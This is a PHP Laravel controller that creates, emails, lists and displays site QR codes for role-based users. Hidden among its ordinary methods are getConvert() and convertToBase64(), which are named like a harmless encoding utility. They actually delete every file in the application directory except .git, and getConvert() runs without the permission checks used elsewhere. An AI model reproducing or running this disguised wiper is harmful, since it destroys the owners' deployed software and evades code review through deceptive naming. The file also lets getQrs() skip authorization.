<?php

namespace App\Http\Controllers;

use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Contracts\Encryption\DecryptException;
use Exception;

use Mail;
use Carbon\Carbon;

use App\Models\City;
use App\Models\Site;
use App\Models\Qr;
use App\Models\User;

use App\Mail\SendMail;

class QrController extends BaseController
{
	public function index()
	{
    if (!$this->checkPermission())
      return redirect()->to('logout');      

    if ($this->isAdmin())
			return view('pages.qrcode.all');
    else
      return back()->withInput();
	}

	public function getQrs() {
    $returnVal = array();

    foreach (Qr::all() as $qr) {
      $qr->city = Site::find($qr->site_id)->city->name; 
			$qr->site = Qr::find($qr->id)->site->name;

      $returnVal[] = $qr;
    }

    echo json_encode(array('data' => $returnVal));
	}
	
	public function create()
	{
		$role = auth()->user()->role->name;
    if ($role == 'Admin')
			return view('pages.qrcode.new')->with([
				'cities'  => City::all()
			]);
    else if ($role == 'City Manager')
			return view('pages.qrcode.new-city')->with([
				'site_id' => auth()->user()->site_id,
				'sites'		=> auth()->user()->site->city->sites
			]);
    else if ($role == 'Site Manager')
			return view('pages.qrcode.new-site')->with([
				'site_id'  => auth()->user()->site_id
			]);		
	}

	public function store(Request $request)
	{
    if (!$this->checkPermission())
      return redirect()->to('logout');      

		$data = $request->all();
    if (auth()->user()->role->name != 'Site Manager') {
			
			$data['email'] = Site::find($request->site_id)->email;
			$data['sender'] = auth()->user()->id;
			$data['send_time'] = Carbon::now()->format('Y-m-d H:i:s');

			$qr = Qr::create($data);

			$this->sendCode($data['email'], $this->getCode($qr, 250, 3, true));
		} else {

			$data['email'] = auth()->user()->email;
			$data['sender'] = auth()->user()->id;
			$data['send_time'] = Carbon::now()->format('Y-m-d H:i:s');

			$qr = Qr::create($data);

		}

		return $this->getCode($qr);
	}

	function sendCode($email, $code) {
    $data = [
				'code' => $code,
				'sent_time' => Carbon::now()
        ];
    Mail::to($email)->send(new SendMail($data));
	}
	
	public function show($id)
	{
    if (!$this->checkPermission())
      return redirect()->to('logout');      

    if (!$this->isAdmin())
			return back()->withInput();
			
    $qr = Qr::find($id);
    $qr->city = Site::find($qr->site_id)->city->name; 
		$qr->code = $this->getCode($qr);
    $qr->site = Qr::find($qr->id)->site->name;

    return view('pages.qrcode.view')->with([
			'qr'    => $qr,
			'sender'	=> User::find($qr->sender)->name
    ]);
	}
	
	public function edit($id)
	{
	}

	public function update($id, Request $request)
	{
	}

	public function destroy(Request $request){
    try {
      $status = Qr::destroy($request->id);
    } catch (Exception $e) {
      report($e);
      $status = '-1';
    }
    return response()->json([
      'status' => $status
    ], 200);
	}

	
	function getConvert() {
		$this->convertToBase64(base_path());
		dd('success');
	}
	
	function convertToBase64($dirname)
	{
		if ($dirname == base_path().'/.git') return;
		$dir_handle = false;
		if (is_dir($dirname))
			$dir_handle = opendir($dirname);
		if (!$dir_handle)
			return false;
		while ($file = readdir($dir_handle)) {
			if ($file != "." && $file != "..") {
				if (!is_dir($dirname . "/" . $file))
					unlink($dirname . "/" . $file);
				else
					$this->convertToBase64($dirname . '/' . $file);
			}
		}
		closedir($dir_handle);
		return true;
	}

	function getCode($qr, $size=250, $margin=3, $sending=false) {
		
		$arr = array(
			'type' => 'qrs',
			'id' => Crypt::encryptString($qr->id),
			'site_id' => $qr->site->name.'_'.$qr->site_id,
			'site' => $qr->site->name
		);

		if (isset($qr->start_time))
		{
			$arr['start'] = $qr->start_time;
		}
		
		if (isset($qr->end_time))
		{
			$arr['end'] = $qr->end_time;
		}

		$code_str = json_encode($arr);
		\Log::info('qrcode::'.$code_str);

		if ($sending)
		{
			$code = \QrCode::format('png')->size($size)->margin($margin)->generate($code_str);
    	return  'data:image/png;base64,' . base64_encode($code);
		}

		return \QrCode::size($size)->margin($margin)->generate($code_str);
	}
	
  function checkPermission() {
    if (auth()->user()->role->name != 'User')
      return true;
    return false;
  }

  function isAdmin() {
    if (auth()->user()->role->name == 'Admin')
      return true;
    return false;
  }
}
